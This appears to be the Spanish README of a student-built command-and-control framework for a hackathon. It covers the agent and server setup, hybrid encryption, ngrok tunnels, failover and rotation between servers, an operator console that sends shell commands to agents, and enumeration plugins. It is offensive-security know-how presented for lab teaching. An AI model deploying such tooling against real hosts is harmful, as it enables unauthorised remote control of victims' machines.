# ALIGO C2 Framework

Framework de Comando y Control (C2) educativo desarrollado para el **Hackathon Aligo Defensores Informáticos 2026**. Implementa una arquitectura distribuida con cifrado híbrido, alta disponibilidad y una interfaz web de operaciones.

> ⚠️ **Solo para uso educativo** en entornos de laboratorio autorizados.

---

## 🏗️ Arquitectura

```
┌──────────────────────────────┐
│  CLIENTE (192.168.1.55)      │
│  ├── Valkey/Redis  :6379     │  ← Registro central de servidores y agentes
│  ├── Streamlit UI  :8501     │  ← Dashboard web de operaciones
│  └── Servidor A    :5000     │  ← Servidor C2 + ngrok
└──────────────┬───────────────┘
               │ Redis (TCP)
       ┌───────┴────────┐
       │                │
┌──────▼──────┐   ┌─────▼───────┐
│  Servidor B │   │  Servidor C │
│  :5001+ngrok│   │  :5002+ngrok│
└─────────────┘   └─────────────┘
       ▲                 ▲
       │   HTTPS E2E     │
       └────────┬────────┘
          ┌─────▼──────┐
          │   AGENTE   │  ← Windows/Linux/macOS
          │  Watchdog  │  ← Failover + Rotación automática
          └────────────┘
```

### Componentes

| Componente | Ruta | Descripción |
|------------|------|-------------|
| Servidor C2 | `server/server.py` | Flask HTTPS + Redis + consola operador |
| Agente | `agent/agent_ngrok.py` | Cliente cifrado + watchdog de HA |
| Plugins | `agent/plugins/` | Módulos extensibles para el agente |
| Criptografía | `shared/crypto_utils.py` | RSA-2048 + Fernet (AES-128-CBC) |
| Interfaz web | `interfaz/cascaron.py` | Dashboard Streamlit |

---

## 🔐 Seguridad

El framework implementa **cifrado híbrido end-to-end**:

1. **Key Exchange (RSA-2048):** Al conectarse, el agente obtiene la clave pública del servidor y la usa para cifrar su session key.
2. **Cifrado de sesión (Fernet / AES-128-CBC + HMAC-SHA256):** Todos los comandos y resultados viajan cifrados con la session key única por agente.
3. **Session key única por agente:** Ningún agente comparte clave con otro.

```
Agente                          Servidor
  │                                │
  │──── GET /public-key ──────────►│
  │◄─── RSA-2048 public key ───────│
  │                                │
  │  genera session_key (Fernet)   │
  │  cifra session_key con RSA     │
  │──── POST /checkin ────────────►│
  │     { encrypted_session_key }  │
  │◄─── { status: ok } ───────────│
  │                                │
  │  ← todos los mensajes van      │
  │    cifrados con session_key →  │
```

---

## 🚀 Instalación

### Requisitos

```bash
pip install -r requirements.txt
```

`requirements.txt`:
```
flask==3.0.0
requests==2.31.0
cryptography==41.0.7
redis==5.0.1
streamlit
```

### Dependencias del sistema

| Herramienta | Propósito | Instalación |
|-------------|-----------|-------------|
| **ngrok** | Túnel HTTPS público | [ngrok.com/download](https://ngrok.com/download) |
| **Valkey/Redis** | Registro distribuido | `sudo dnf install valkey` (Fedora) |

---

## ⚡ Inicio Rápido

### 1. Cliente (también Servidor A)

```bash
# Terminal 1: Iniciar Valkey
sudo valkey-server --bind 0.0.0.0 --protected-mode no --port 6379

# Terminal 2: Iniciar Servidor A
cd server
export REDIS_HOST=127.0.0.1
export REDIS_PORT=6379
python3 server.py 5000 server-A

# Terminal 3: Exponer con ngrok
ngrok http 5000

# Terminal 4: Interfaz web
cd interfaz
streamlit run cascaron.py
# Acceder: http://localhost:8501 o http://192.168.1.55:8501
```

### 2. Servidores B y C (otros computadores)

```bash
# Clonar el repositorio
git clone https://github.com/dassjoss/aligo-c2-frameworkk.git
cd aligo-c2-frameworkk
git checkout feature/https-migration

# Terminal 1: Iniciar Servidor B
export REDIS_HOST=192.168.1.55   # IP del Cliente
export REDIS_PORT=6379
python3 server/server.py 5001 server-B

# Terminal 2: ngrok
ngrok http 5001
```

Para Servidor C, usar puerto `5002` y nombre `server-C`.

### 3. Agente (computador objetivo)

```bash
# Clonar el repositorio
git clone https://github.com/dassjoss/aligo-c2-frameworkk.git
cd aligo-c2-frameworkk
git checkout feature/https-migration

# Conectar al Servidor A por ngrok
export REDIS_HOST=192.168.1.55
export REDIS_PORT=6379
export CURRENT_SERVER=server-A
python3 agent/agent_ngrok.py https://XXXX.ngrok-free.dev
```

Obtén la URL de ngrok del Servidor A desde el Cliente:
```bash
redis-cli -h 127.0.0.1 -p 6379 GET "server:server-A:ngrok_url"
```

---

## 🖥️ Consola del Operador (Servidor)

El servidor expone una consola interactiva en la terminal:

```
> list                          # Lista agentes activos (< 30 segundos)
> servers                       # Lista servidores registrados en Redis
> use agent-abc123 whoami       # Envía comando a un agente específico
> use @agent ipconfig           # Envía a el único agente conectado
> exit                          # Cierra el servidor
```

---

## 🌐 Interfaz Web (Streamlit)

Accesible en `http://192.168.1.55:8501` desde cualquier computador de la red.

### Funcionalidades

| Tab | Descripción |
|-----|-------------|
| **📝 Ejecutar Comando** | Envía comandos shell al agente y muestra salida real |
| **🔌 Plugins** | Despliega módulos de diagnóstico avanzado |
| **🔄 Rotación** | Control del sistema de alta disponibilidad |
| **📜 Historial** | Registro de comandos ejecutados en la sesión |

---

## 🔌 Plugins

Los plugins viven en `agent/plugins/` y extienden las capacidades del agente sin modificar su lógica principal.

| Plugin | Descripción |
|--------|-------------|
| `sysinfo` | Auditoría de hardware y sistema operativo |
| `process_list` | Lista todos los procesos en ejecución |
| `network_enum` | Interfaces de red activas y tabla ARP |
| `portscanner` | Puertos abiertos en el sistema local |
| `file_extractor` | Lista logs y archivos de auditoría |
| `rotate_server` | Rotación y failover del servidor C2 |

### Cómo se invocan

Desde la interfaz web (tab Plugins) o desde la consola del operador:

```
> use @agent __plugin__sysinfo
> use @agent __plugin__network_enum
> use @agent __plugin__rotate_server status
```

### Crear un plugin nuevo

```python
# agent/plugins/mi_plugin.py
from plugins import BasePlugin

class Plugin(BasePlugin):
    name = "mi_plugin"
    description = "Descripción del plugin"

    def run(self, args=None):
        # Lógica del plugin
        return "resultado"
```

---

## 🔄 Alta Disponibilidad (HA)

El agente incluye un **watchdog** que corre en background y gestiona:

### Failover automático

```
Estado normal:   Agente ←→ Servidor A
A se cae:        Watchdog detecta fallo en /health
                 → Agente conecta automáticamente a Servidor B
                 → B toma el rol activo
```

### Rotación programada (cada 90 minutos)

```
Agente en B → 90 min → Rota a C → 90 min → Rota a A → ...
```

### Flujo completo

```
INICIO: Agente → A (activo)
        │
        ├── A no cae
        │     └── 90 min → rota a B o C → continúa
        │
        └── A cae
              └── Failover → B toma rol
                    │
                    ├── B no cae
                    │     └── 90 min → rota a C → continúa
                    │
                    └── B cae
                          └── C toma rol
                                └── A intenta reconectarse en loop
                                      └── A vuelve → 90 min → rota → ciclo completo
```

### Control desde el cascaron

1. **Inicializar:** Tab Rotación → "⚙️ INICIALIZAR SISTEMA HA"
2. **Activar rotación:** Configurar intervalo → "✅ ACTIVAR"
3. **Failover manual:** "⚡ FAILOVER" → conecta al siguiente servidor
4. **Estado:** "📊 VER ESTADO COMPLETO"

### Comandos del plugin rotate_server

```
__plugin__rotate_server status      → Estado completo del sistema HA
__plugin__rotate_server setup       → Inicializar prioridades en Redis
__plugin__rotate_server auto_on     → Activar rotación automática
__plugin__rotate_server auto_off    → Desactivar rotación automática
__plugin__rotate_server failover    → Ejecutar failover manual
__plugin__rotate_server server-B    → Rotar a servidor específico
```

---

## 📡 API del Servidor

| Método | Endpoint | Descripción |
|--------|----------|-------------|
| `GET` | `/public-key` | Retorna la clave pública RSA del servidor |
| `POST` | `/checkin` | Registro inicial del agente con session key |
| `POST` | `/poll` | El agente consulta comandos pendientes |
| `POST` | `/result` | El agente envía resultado de un comando |
| `POST` | `/command` | La UI envía comandos al agente |
| `GET` | `/health` | Estado del servidor |
| `GET` | `/servers-list` | Lista servidores registrados en Redis |

---

## 📦 Estructura del Proyecto

```
aligo-c2-frameworkk/
├── agent/
│   ├── agent_ngrok.py          # Agente HTTPS con cifrado + watchdog HA
│   ├── plugins/
│   │   ├── __init__.py         # BasePlugin clase base
│   │   ├── sysinfo.py          # Info de sistema
│   │   ├── process_list.py     # Lista de procesos
│   │   ├── network_enum.py     # Enumeración de red
│   │   ├── portscanner.py      # Escáner de puertos
│   │   ├── file_extractor.py   # Extractor de logs
│   │   └── rotate_server.py    # Alta disponibilidad
│   └── README_AGENTE.md
│
├── server/
│   └── server.py               # Servidor Flask HTTPS + Redis
│
├── shared/
│   └── crypto_utils.py         # RSA-2048 + Fernet utils
│
├── interfaz/
│   └── cascaron.py             # Dashboard Streamlit
│
├── docs/                       # Documentación técnica adicional
├── scripts/                    # Scripts de utilidad
├── test_crypto.py              # Suite de pruebas criptográficas
└── requirements.txt
```

---

## 🧪 Pruebas

```bash
# Suite de pruebas criptográficas
python3 test_crypto.py

# Verificar que el servidor responde
curl http://localhost:5000/health

# Verificar servidores en Redis
redis-cli -h 127.0.0.1 -p 6379 KEYS "server:*"

# Verificar agentes en Redis
redis-cli -h 127.0.0.1 -p 6379 KEYS "agent:*"
```

---

## 🔧 Variables de Entorno

| Variable | Defecto | Descripción |
|----------|---------|-------------|
| `REDIS_HOST` | `127.0.0.1` | IP del servidor Redis/Valkey |
| `REDIS_PORT` | `6379` | Puerto de Redis |
| `CURRENT_SERVER` | `""` | Nombre del servidor activo (para watchdog) |
| `PORT` | `5000` | Puerto del servidor Flask |

---

## 👥 Equipo

| Nombre | Rol |
|--------|-----|
| Pablo | Project Management, Planning y Pitch |
| Natalia | Interfaz de Operador e Integración |
| Jose | Desarrollo del Agente y Lógica de Endpoint |
| Alex | Desarrollo del Servidor y Protocolos de Seguridad |

---

## 📚 Documentación adicional

| Documento | Descripción |
|-----------|-------------|
| `docs/CRYPTO_IMPLEMENTATION.md` | Implementación técnica del cifrado |
| `docs/CRYPTO_QUICKSTART.md` | Guía rápida de criptografía |
| `docs/architecture.md` | Arquitectura detallada |
| `docs/PROTOCOL_AUDIT_REPORT.md` | Análisis de seguridad del protocolo |
| `docs/DESPLIEGUE_REAL.md` | Guía de despliegue en red real |
| `agent/README_AGENTE.md` | Documentación específica del agente |

---

## ⚠️ Aviso Legal

Este software es desarrollado **exclusivamente con fines educativos** dentro de entornos de laboratorio autorizados como parte del Hackathon Aligo Defensores Informáticos 2026. El uso no autorizado para propósitos maliciosos está estrictamente prohibido y es ilegal.
